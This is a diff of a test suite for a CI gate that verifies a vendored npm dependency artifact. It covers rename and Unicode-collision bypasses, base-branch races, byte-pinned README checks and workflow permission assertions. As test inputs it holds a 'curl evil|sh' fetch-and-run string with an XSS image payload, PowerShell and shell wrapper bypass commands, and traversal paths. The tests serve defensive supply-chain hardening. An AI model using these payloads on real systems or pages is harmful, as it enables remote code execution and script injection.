@@ -8,23 +8,22 @@ import { fileURLToPath } from "node:url";
 import {
   assertPolicyShape,
   checkGitattributes,
+  classifyChangedFiles,
   classifyChangedPaths,
-  commandProgram,
+  collectProtectedPathIdentityProblems,
+  diffImmutableTrees,
   evaluateCandidate,
   extractAdvisoryIds,
   extractPolicyLiterals,
   gitBlobId,
   isUnsafeRepositoryPath,
   loadPolicy,
+  normalizeRepositoryPath,
   parseCandidateTarball,
   sanitizeToken,
-  scanDocumentForForbiddenCommands,
+  validateChangedFileRecords,
   Verdict,
 } from "../../scripts/trusted/verify-dependency-artifact-gate.mjs";
-import {
-  buildCheckRun,
-  decodeVerdict,
-} from "../../scripts/trusted/publish-gate-check.mjs";
 
 const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
 const realPolicy = loadPolicy(repoRoot);
@@ -228,16 +227,11 @@ const PACKAGE_LOCK = {
 
 const GITATTRIBUTES = "vendor/npm/**/*.tgz binary\nvendor/npm/**/*.json text eol=lf\n";
 const SAFE_README = [
-  "# Reviewed artifact",
+  "# Reviewed dependency artifact",
   "",
-  "Run the trusted procedure:",
+  "This file is immutable metadata for the reviewed dependency artifact.",
   "",
-  "```bash",
-  '"$OCEAN_TRUSTED_NODE" "$OCEAN_TRUSTED_NPM_CLI" ci --ignore-scripts --no-bin-links',
-  '"$OCEAN_TRUSTED_NODE" scripts/verify-fast-uri-artifact.mjs',
-  "```",
-  "",
-  "Do not run `npm ci` before trust is established.",
+  "The only pre-trust procedure is the protected-default-branch runbook.",
   "",
 ].join("\n");
 
@@ -283,16 +277,38 @@ function candidate({ tarball, files = {}, modes = {}, extraPaths = [] } = {}) {
   };
 }
 
-async function judge({ policy, tree, changedPaths, artifactRequired = true, ...rest }) {
+function withoutReviewedArtifact(tree) {
+  return {
+    ...tree,
+    treeEntries: tree.treeEntries.filter(
+      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
+    ),
+  };
+}
+
+async function judge({
+  policy,
+  tree,
+  baseTree,
+  changedPaths,
+  changedFiles,
+  artifactRequired = true,
+  ...rest
+}) {
+  const immutableBase = baseTree ?? (artifactRequired ? tree : withoutReviewedArtifact(tree));
   return evaluateCandidate({
     policy,
     baseRef: "main",
     defaultBranch: "main",
     eventHeadSha: HEAD_SHA,
+    eventBaseSha: "b".repeat(40),
     currentHeadSha: HEAD_SHA,
+    currentBaseSha: "b".repeat(40),
+    currentBaseRef: "main",
+    changedFiles,
     changedPaths,
+    baseTreeEntries: immutableBase.treeEntries,
     treeEntries: tree.treeEntries,
-    artifactRequired,
     readBlob: tree.readBlob,
     ...rest,
   });
@@ -399,37 +415,35 @@ describe("authoritative gate — candidate self-attestation is worthless", () =>
     });
   });
 
-  it("passes a policy-only pull request without pretending an artifact was validated", async () => {
+  it("revalidates the base-required artifact during a policy-only pull request", async () => {
     const tarball = buildTarball(goodTarEntries());
     const verdict = await judge({
       policy: policyFor(tarball),
       tree: candidate({ tarball }),
       changedPaths: [".github/trusted-policy/dependency-artifact-policy.json"],
     });
-    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "policy-only" });
-    expect(verdict.messages.join(" ")).toMatch(/no artifact was validated/);
+    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "artifact" });
+    expect(verdict.messages.join(" ")).toMatch(/validated/);
   });
 
-  it("passes an unrelated pull request so the required check is never missing", async () => {
+  it("revalidates the base-required artifact on an otherwise unrelated pull request", async () => {
     const tarball = buildTarball(goodTarEntries());
     const verdict = await judge({
       policy: policyFor(tarball),
       tree: candidate({ tarball }),
       changedPaths: ["docs/index.md"],
     });
-    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "not-applicable" });
+    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "artifact" });
   });
 
   it("refuses to let a candidate delete the reviewed artifact once base carries it", async () => {
     const tarball = buildTarball(goodTarEntries());
     const policy = policyFor(tarball);
-    const tree = candidate({ tarball });
-    tree.treeEntries = tree.treeEntries.filter(
-      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
-    );
-    const verdict = await judge({ policy, tree, changedPaths: GUARDED_CHANGE });
+    const baseTree = candidate({ tarball });
+    const tree = withoutReviewedArtifact(candidate({ tarball }));
+    const verdict = await judge({ policy, tree, baseTree, changedPaths: ["docs/index.md"] });
     expect(verdict.failed).toBe(true);
-    expect(verdict.messages.join("\n")).toMatch(/removal requires a trusted policy change/);
+    expect(verdict.messages.join("\n")).toMatch(/removes or moves a reviewed dependency artifact/);
   });
 });
 
@@ -773,7 +787,7 @@ describe("authoritative gate — event, race and bound semantics", () => {
       treeTruncated: true,
     });
     expect(truncatedTree.failed).toBe(true);
-    expect(truncatedTree.messages.join("\n")).toMatch(/tree listing was truncated/);
+    expect(truncatedTree.messages.join("\n")).toMatch(/base or candidate tree listing was truncated/);
   });
 
   it("rejects unsafe changed paths outright", async () => {
@@ -838,56 +852,200 @@ describe("authoritative gate — event, race and bound semantics", () => {
 });
 
 /* ------------------------------------------------------------------ *
- * 5. Documentation scanner (HIGH findings 1 and 2, enforced from base)
+ * 5. Immutable base/head paths close rename and omission bypasses
  * ------------------------------------------------------------------ */
 
-describe("authoritative gate — documented procedure scanner", () => {
-  const flagged = markdown =>
-    scanDocumentForForbiddenCommands(realPolicy, markdown, "doc.md");
-
-  it("is not vacuous: it flags the exact instructions the review rejected", () => {
-    const unsafe = [
-      "```powershell",
-      "npm ci",
-      "npm run verify:dependency-artifacts",
-      "npm test",
-      "```",
-    ].join("\n");
-    const errors = flagged(unsafe);
-    expect(errors).toHaveLength(3);
-    expect(errors.join("\n")).toMatch(/runs 'npm' before trust is established/);
-  });
-
-  it("flags npx, yarn, pnpm and node_modules/.bin shims", () => {
-    for (const command of [
-      "npx vitest run",
-      "yarn install",
-      "pnpm install",
-      "node_modules/.bin/vitest run",
+describe("authoritative gate — immutable path and rename evidence", () => {
+  it("classifies both sides of a guarded-to-unguarded or unguarded-to-guarded rename", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const policy = policyFor(tarball);
+    for (const file of [
+      {
+        status: "renamed",
+        previous_filename: "vendor/npm/fast-uri/3.1.7/README.md",
+        filename: "docs/reviewed-artifact.md",
+      },
+      {
+        status: "renamed",
+        previous_filename: "docs/reviewed-artifact.md",
+        filename: "vendor/npm/fast-uri/3.1.7/README.md",
+      },
     ]) {
-      expect(flagged(["```bash", command, "```"].join("\n")).length).toBeGreaterThan(0);
+      expect(classifyChangedFiles(policy, [file]).guarded.length, file.filename).toBeGreaterThan(0);
+      const verdict = await judge({
+        policy,
+        tree: candidate({ tarball }),
+        changedFiles: [file],
+      });
+      expect(verdict.failed, file.filename).toBe(true);
+      expect(verdict.messages.join("\n"), file.filename).toMatch(/protected-path rename/);
     }
   });
 
-  it("sees through prompts, environment prefixes and chained commands", () => {
-    expect(flagged(["```bash", "$ FOO=bar npm ci", "```"].join("\n")).length).toBe(1);
-    expect(flagged(["```bash", "cd repo && npm test", "```"].join("\n")).length).toBe(1);
-    expect(flagged(["```bash", 'PS C:\\r> npm run verify:sri', "```"].join("\n")).length).toBe(1);
-  });
-
-  it("accepts the trusted direct procedure", () => {
-    expect(flagged(SAFE_README)).toEqual([]);
-  });
-
-  it("allows prose that explicitly forbids a command", () => {
-    expect(flagged("Do not run `npm ci` before the bootstrap gate.")).toEqual([]);
-    expect(flagged("Run `npm ci` first.").length).toBe(1);
-  });
-
-  it("blocks a candidate README that reintroduces pre-trust commands", async () => {
+  it("fails a renamed record that omits previous_filename", async () => {
     const tarball = buildTarball(goodTarEntries());
     const policy = policyFor(tarball);
-    const unsafeReadme = ["# Reviewed", "", "```powershell", "npm ci", "npm test", "```", ""].join("\n");
+    expect(
+      validateChangedFileRecords(policy, [
+        { status: "renamed", filename: "docs/reviewed-artifact.md" },
+      ]),
+    ).toContain("renamed pull-file record omits previous_filename");
+    const verdict = await judge({
+      policy,
+      tree: candidate({ tarball }),
+      changedFiles: [{ status: "renamed", filename: "docs/reviewed-artifact.md" }],
+    });
+    expect(verdict.failed).toBe(true);
+    expect(verdict.messages.join("\n")).toMatch(/omits previous_filename/);
+  });
+
+  it("rejects a case-only protected rename even when a file listing calls it unrelated", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const baseTree = candidate({ tarball });
+    const tree = candidate({ tarball });
+    tree.treeEntries = tree.treeEntries.map(entry =>
+      entry.path === "vendor/npm/fast-uri/3.1.7/README.md"
+        ? { ...entry, path: "vendor/npm/fast-uri/3.1.7/readme.md" }
+        : entry,
+    );
+    const verdict = await judge({
+      policy: policyFor(tarball),
+      baseTree,
+      tree,
+      changedFiles: [{ status: "modified", filename: "docs/index.md" }],
+    });
+    expect(verdict.failed).toBe(true);
+    expect(verdict.messages.join("\n")).toMatch(/ASCII-case collision|removes or moves/);
+  });
+
+  it("rejects Unicode composed/decomposed collisions beneath guarded vendor paths", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const baseTree = candidate({
+      tarball,
+      files: { "vendor/npm/fast-uri/3.1.7/caf\u00e9.txt": "base" },
+    });
+    const tree = candidate({
+      tarball,
+      files: { "vendor/npm/fast-uri/3.1.7/cafe\u0301.txt": "head" },
+    });
+    const verdict = await judge({
+      policy: policyFor(tarball),
+      baseTree,
+      tree,
+      changedFiles: [{ status: "modified", filename: "docs/index.md" }],
+    });
+    expect(normalizeRepositoryPath("vendor\\npm\\fast-uri")).toBe("vendor/npm/fast-uri");
+    expect(verdict.failed).toBe(true);
+    expect(verdict.messages.join("\n")).toMatch(/Unicode-normalization collision/);
+  });
+
+  it("rejects backslash, control, and dot-segment paths from immutable tree data", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    for (const unsafePath of [
+      "vendor\\npm\\fast-uri\\3.1.7\\README.md",
+      "vendor/npm/fast-uri/3.1.7/\u0000README.md",
+      "vendor/npm/fast-uri/3.1.7/../README.md",
+    ]) {
+      const baseTree = candidate({ tarball });
+      const tree = candidate({ tarball });
+      tree.treeEntries = tree.treeEntries.map(entry =>
+        entry.path === "vendor/npm/fast-uri/3.1.7/README.md"
+          ? { ...entry, path: unsafePath }
+          : entry,
+      );
+      const verdict = await judge({
+        policy: policyFor(tarball),
+        baseTree,
+        tree,
+        changedFiles: [{ status: "modified", filename: "docs/index.md" }],
+      });
+      expect(verdict.failed, unsafePath).toBe(true);
+      expect(verdict.messages.join("\n"), unsafePath).toMatch(/unsafe path/);
+    }
+  });
+
+  it("fails incomplete pull-files data when immutable trees show a protected change", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const baseTree = candidate({ tarball });
+    const tree = withoutReviewedArtifact(candidate({ tarball }));
+    const verdict = await judge({
+      policy: policyFor(tarball),
+      baseTree,
+      tree,
+      changedFiles: [{ status: "modified", filename: "docs/index.md" }],
+      changedFilesTruncated: true,
+    });
+    expect(verdict.toJSON()).toMatchObject({ conclusion: "failure", mode: "unbounded-change" });
+    expect(verdict.messages.join("\n")).toMatch(/pull-file listing was incomplete/);
+  });
+
+  it("does not let artifact disappearance bypass an unguarded pull-file classification", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const verdict = await judge({
+      policy: policyFor(tarball),
+      baseTree: candidate({ tarball }),
+      tree: withoutReviewedArtifact(candidate({ tarball })),
+      changedFiles: [{ status: "modified", filename: "docs/index.md" }],
+    });
+    expect(verdict.failed).toBe(true);
+    expect(verdict.messages.join("\n")).toMatch(/removes or moves a reviewed dependency artifact/);
+  });
+
+  it("uses the immutable diff to stop a two-PR metadata/listing bypass", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const baseTree = candidate({ tarball });
+    const altered = structuredClone(PACKAGE_JSON);
+    altered.devDependencies["fast-uri"] = "file:vendor/npm/fast-uri/3.1.7/other.tgz";
+    const tree = candidate({
+      tarball,
+      files: { "package.json": JSON.stringify(altered) },
+    });
+    const immutable = diffImmutableTrees(baseTree.treeEntries, tree.treeEntries);
+    expect(immutable.changes.map(change => change.filename)).toContain("package.json");
+    const verdict = await judge({
+      policy: policyFor(tarball),
+      baseTree,
+      tree,
+      changedFiles: [
+        {
+          status: "modified",
+          filename: ".github/trusted-policy/dependency-artifact-policy.json",
+        },
+      ],
+    });
+    expect(verdict.failed).toBe(true);
+    expect(verdict.toJSON().mode).toBe("mixed-trusted-and-guarded");
+  });
+
+  it("rejects a base update race as well as a force-push", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const verdict = await judge({
+      policy: policyFor(tarball),
+      tree: candidate({ tarball }),
+      changedPaths: GUARDED_CHANGE,
+      currentBaseSha: "c".repeat(40),
+    });
+    expect(verdict.failed).toBe(true);
+    expect(verdict.messages.join("\n")).toMatch(/base moved during validation/);
+  });
+});
+
+/* ------------------------------------------------------------------ *
+ * 6. Candidate documentation is byte-pinned, not shell-token parsed
+ * ------------------------------------------------------------------ */
+
+describe("authoritative gate — candidate documentation is inert exact data", () => {
+  it("does not retain a shell-token denylist control", () => {
+    const source = readText("scripts", "trusted", "verify-dependency-artifact-gate.mjs");
+    expect(source).not.toContain("scanDocumentForForbiddenCommands");
+    expect(source).not.toContain("commandProgram");
+    expect(source).not.toContain("documentScan");
+  });
+
+  it("requires the candidate vendor README to match the protected byte pin", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const policy = policyFor(tarball);
+    const unsafeReadme = ["# Reviewed", "", "npm ci", ""].join("\n");
     const verdict = await judge({
       policy,
       tree: candidate({
@@ -897,21 +1055,41 @@ describe("authoritative gate — documented procedure scanner", () => {
       changedPaths: GUARDED_CHANGE,
     });
     expect(verdict.failed).toBe(true);
-    expect(verdict.messages.join("\n")).toMatch(
-      /README\.md:\d+ runs 'npm' before trust is established/,
-    );
+    expect(verdict.messages.join("\n")).toMatch(/README\.md.*does not match base policy|README\.md.*expected/);
   });
 
-  it("resolves the program a shell would actually run", () => {
-    expect(commandProgram("  npm ci ")).toBe("npm");
-    expect(commandProgram('"$OCEAN_TRUSTED_NODE" script.mjs')).toBe("$OCEAN_TRUSTED_NODE");
-    expect(commandProgram("# comment")).toBeNull();
-    expect(commandProgram("")).toBeNull();
+  it("rejects wrapper and quoting bypasses because no candidate command is accepted", async () => {
+    const tarball = buildTarball(goodTarEntries());
+    const policy = policyFor(tarball);
+    const bypasses = [
+      "command npm ci",
+      "env SAFE=1 npm ci",
+      "C:\\\\Program Files\\\\nodejs\\\\npm.cmd ci",
+      "npm.exe ci",
+      "& npm ci",
+      "function npm { Invoke-Expression $args }; npm ci",
+      "npm `\nci",
+      "$(npm ci)",
+    ];
+    for (const command of bypasses) {
+      const verdict = await judge({
+        policy,
+        tree: candidate({
+          tarball,
+          files: {
+            "vendor/npm/fast-uri/3.1.7/README.md": `# Candidate\n\n\`\`\`powershell\n${command}\n\`\`\`\n`,
+          },
+        }),
+        changedPaths: GUARDED_CHANGE,
+      });
+      expect(verdict.failed, command).toBe(true);
+      expect(verdict.messages.join("\n"), command).toMatch(/README\.md.*does not match base policy|README\.md.*expected/);
+    }
   });
 });
 
 /* ------------------------------------------------------------------ *
- * 6. Static trust-boundary assertions on the workflow itself
+ * 7. Static trust-boundary assertions on the workflow itself
  * ------------------------------------------------------------------ */
 
 describe("trusted-dependency-artifact workflow — static trust boundary", () => {
@@ -958,7 +1136,7 @@ describe("trusted-dependency-artifact workflow — static trust boundary", () =>
     const checkoutRefs = [...gateWorkflow.matchAll(/^\s*ref:\s*(.+)$/gm)].map(m => m[1].trim());
     expect(checkoutRefs.length).toBeGreaterThan(0);
     for (const ref of checkoutRefs) {
-      expect(ref).toBe("${{ github.event.repository.default_branch }}");
+      expect(ref).toBe("${{ github.event.pull_request.base.sha }}");
     }
   });
 
@@ -971,19 +1149,11 @@ describe("trusted-dependency-artifact workflow — static trust boundary", () =>
 
   it("grants the minimum scopes and keeps write away from candidate data", () => {
     expect(gateWorkflow).toMatch(/^permissions: \{\}$/m);
-    const validate = gateWorkflow.slice(
-      gateWorkflow.indexOf("  validate:"),
-      gateWorkflow.indexOf("  publish:"),
-    );
-    expect(validate).toMatch(/permissions:\n\s+contents: read\n/);
-    expect(validate).not.toMatch(/checks:\s*write/);
-    expect(validate).not.toMatch(/security-events/);
-    expect(validate).not.toMatch(/pull-requests:\s*write/);
-
-    const publish = gateWorkflow.slice(gateWorkflow.indexOf("  publish:"));
-    expect(publish).toMatch(/permissions:\n\s+contents: read\n\s+checks: write\n/);
-    // The only job holding a write scope must never read candidate content.
-    expect(publish).not.toMatch(/verify-dependency-artifact-gate/);
+    const preflight = gateWorkflow.slice(gateWorkflow.indexOf("  preflight:"));
+    expect(preflight).toMatch(/permissions:\n\s+contents: read\n/);
+    expect(preflight).not.toMatch(/checks:\s*write/);
+    expect(preflight).not.toMatch(/security-events/);
+    expect(preflight).not.toMatch(/pull-requests:\s*write/);
   });
 
   it("runs no npm, npx, package script or candidate code", () => {
@@ -1016,61 +1186,47 @@ describe("trusted-dependency-artifact workflow — static trust boundary", () =>
     expect(gateSource).not.toMatch(/node:vm/);
   });
 
-  it("publishes the authoritative check on the pull request head SHA", () => {
-    const publisher = readText("scripts", "trusted", "publish-gate-check.mjs");
-    expect(publisher).toMatch(/head_sha: headSha/);
+  it("captures immutable base and head identities but never publishes a required check", () => {
     expect(gateWorkflow).toMatch(/GATE_HEAD_SHA: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/);
-    expect(realPolicy.checkName).toBe("trusted-dependency-artifact");
+    expect(gateWorkflow).toMatch(/GATE_BASE_SHA: \$\{\{ github\.event\.pull_request\.base\.sha \}\}/);
+    expect(gateWorkflowCode).not.toMatch(/checks:\s*write/);
+    expect(gateWorkflowCode).not.toMatch(/publish-gate-check/);
+    expect(gateWorkflowCode).not.toMatch(/trusted-dependency-artifact\s+on the pull request head/i);
+  });
+});
+
+describe("security-scan workflow — least privilege hardening", () => {
+  const securityScan = readText(".github", "workflows", "security-scan.yml");
+
+  it("does not grant security-events write to jobs that do not upload security events", () => {
+    expect(securityScan).toMatch(/^permissions: \{\}$/m);
+    expect(securityScan).not.toMatch(/security-events:\s*write/);
+    for (const job of ["python-audit", "npm-audit"]) {
+      const start = securityScan.indexOf(`  ${job}:`);
+      const nextOffset = securityScan
+        .slice(start + 1)
+        .search(/\n  [A-Za-z0-9_-]+:/);
+      const body = securityScan.slice(
+        start,
+        nextOffset < 0 ? undefined : start + 1 + nextOffset,
+      );
+      expect(body, job).toMatch(/permissions:\n\s+contents: read/);
+    }
   });
 
-  it("publishes even when validate fails, is cancelled or is skipped", () => {
-    expect(gateWorkflow).toMatch(/needs: \[validate\]\n\s+if: always\(\)/);
-    for (const result of ["failure", "cancelled", "skipped"]) {
-      expect(decodeVerdict(undefined, result).conclusion).toBe("failure");
-    }
+  it("drops checkout credentials in both scanning jobs", () => {
+    const checkouts = securityScan.match(/uses: actions\/checkout@/g) ?? [];
+    const disabled = securityScan.match(/persist-credentials: false/g) ?? [];
+    expect(checkouts).toHaveLength(2);
+    expect(disabled).toHaveLength(2);
   });
 });
 
 /* ------------------------------------------------------------------ *
- * 7. Verdict transport and summary sanitisation
+ * 8. Verdict messaging remains bounded
  * ------------------------------------------------------------------ */
 
-describe("authoritative gate — verdict transport", () => {
-  const encode = value => Buffer.from(JSON.stringify(value), "utf8").toString("base64");
-
-  it("never reports success when the validate job did not succeed", () => {
-    const passing = { conclusion: "success", mode: "artifact", messages: [] };
-    expect(decodeVerdict(encode(passing), "success").conclusion).toBe("success");
-    expect(decodeVerdict(encode(passing), "failure").conclusion).toBe("failure");
-    expect(decodeVerdict(encode(passing), "cancelled").conclusion).toBe("failure");
-  });
-
-  it("rejects a malformed or absent verdict rather than guessing", () => {
-    expect(decodeVerdict("not-base64-json", "success").conclusion).toBe("failure");
-    expect(decodeVerdict(encode({ conclusion: "success" }), "success").conclusion).toBe("failure");
-    expect(decodeVerdict(encode({ conclusion: "success", mode: "made-up", messages: [] }), "success").conclusion).toBe("failure");
-    expect(decodeVerdict("", "success").conclusion).toBe("failure");
-  });
-
-  it("strips candidate-controlled markup out of the check summary", () => {
-    const hostile = "`curl evil|sh` <img src=x onerror=alert(1)> \n\n### heading";
-    const check = buildCheckRun({
-      policy: realPolicy,
-      headSha: HEAD_SHA,
-      verdict: decodeVerdict(
-        encode({ conclusion: "failure", mode: "artifact", messages: [hostile] }),
-        "failure",
-      ),
-      runUrl: "https://example.invalid/run",
-    });
-    expect(check.name).toBe("trusted-dependency-artifact");
-    expect(check.head_sha).toBe(HEAD_SHA);
-    expect(check.conclusion).toBe("failure");
-    expect(check.output.summary).not.toContain("<img");
-    expect(check.output.summary).not.toContain("`");
-    expect(check.output.summary).not.toContain("###");
-  });
-
+describe("authoritative gate — verdict messaging", () => {
   it("bounds message count and length", () => {
     const verdict = new Verdict({ maxMessages: 3, maxMessageLength: 10 });
     for (let index = 0; index < 10; index += 1) verdict.note(`message-${index}-padding`);
@@ -1081,7 +1237,7 @@ describe("authoritative gate — verdict transport", () => {
 });
 
 /* ------------------------------------------------------------------ *
- * 8. The committed policy itself
+ * 9. The committed policy itself
  * ------------------------------------------------------------------ */
 
 describe("trusted policy document", () => {
@@ -1097,6 +1253,23 @@ describe("trusted policy document", () => {
     );
     expect(realPolicy.package.dependentRange).toBe("^3.0.1");
     expect(realPolicy.verifierPolicyLiterals.requiredAdvisories).toHaveLength(6);
+  });
+
+  it("pins the command-free vendor README template as exact protected bytes", () => {
+    const template = readText(
+      ".github",
+      "trusted-policy",
+      "vendor-readme-template.md",
+    );
+    const readme = realPolicy.documentation.vendorReadme;
+    expect(readme.path).toBe("vendor/npm/fast-uri/3.1.7/README.md");
+    expect(readme.sha256).toBe(sha256(Buffer.from(template, "utf8")));
+    expect(readme.size).toBe(Buffer.byteLength(template, "utf8"));
+    expect(realPolicy.digestPins[readme.path]).toEqual({
+      sha256: readme.sha256,
+      size: readme.size,
+    });
+    expect(template).not.toMatch(/```|npm|npx|yarn|pnpm|powershell/i);
   });
 
   it("guards every path a dependency-artifact change can travel through", () => {
@@ -1118,6 +1291,21 @@ describe("trusted policy document", () => {
   it("treats its own infrastructure as trusted, not merely guarded", () => {
     for (const path of realPolicy.trustedPaths) {
       expect(classifyChangedPaths(realPolicy, [path]).trusted, path).toContain(path);
+    }
+  });
+
+  it("treats every settings asset and pre-trust runbook as trusted", () => {
+    for (const path of [
+      ".github/trusted-policy/trusted-dependency-artifact-ruleset.plan.json",
+      ".github/trusted-policy/trusted-dependency-artifact-app-contract.json",
+      ".github/trusted-policy/PRETRUST-REVIEW-RUNBOOK.md",
+      ".github/TRUSTED-DEPENDENCY-GATE.md",
+      "SECURITY.md",
+      "scripts/trusted/Invoke-TrustedDependencyArtifactRuleset.ps1",
+      "scripts/trusted/trusted-dependency-ruleset.mjs",
+      "scripts/verify-required-checks.mjs",
+    ]) {
+      expect(realPolicy.trustedPaths).toContain(path);
     }
   });
 
